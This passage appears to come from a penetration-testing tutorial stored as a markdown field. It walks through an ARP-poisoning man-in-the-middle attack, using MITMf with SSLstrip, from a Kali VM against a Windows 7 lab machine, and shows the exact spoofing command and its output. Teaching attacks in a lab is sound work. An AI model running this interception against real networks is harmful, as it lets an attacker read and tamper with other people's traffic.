  md: 'MITMf, is it can run SSLstrip+, so in many cases you can view data from encrypted
    pages.


    # Simple ARP attacks


    Let''s start with a simple MitM ARP poisoning attack against our Windows 7 VM.
    This attack will modify the ARP tables of the target system and router, inserting
    our attacking system in the middle of the traffic stream.


    Open a command prompt on your Windows 7 VM

    Type "arp -a"


    Windows will respond with a list of ARP table entries, like the simulated example
    below:


    ```

    C:\Users\Dan>arp -a


    Interface: 192.168.1.93 --- 0xb

    Internet Address Physical Address Type

    192.168.1.1 22-56-bd-26-47-20 dynamic

    ```


    Notice the MAC, or Physical address listed for the router at 192.168.1.1.


    On your Kali VM:


    ```

    "mitmf -i eth0 --spoof arp --gateway 192.168.1.1 --target 192.168.1.93"

    ```


    ```

    root@kali:~# mitmf -i eth0 --spoof arp --gateway 192.168.1.1 --target 192.168.1.93


    [*] MITMf v0.9.8 - ''The Dark Side''

    |_ Spoof v0.6

    |_ ARP spoofing enabled

    |_ Sergio-Proxy v0.2.1 online

    SSStrip v0.9 by Moxie Marlinspike online

    ```


    ![](img/37a3b7ef116f9ef991f9e33dd8b348c7_198_0.png)


    Now, back on the Windows 7 system:


    run the "arp -a" command again


    You should see a different result this time for the router address:


    ```

    C:\Users\Dan>arp -a

    ```'
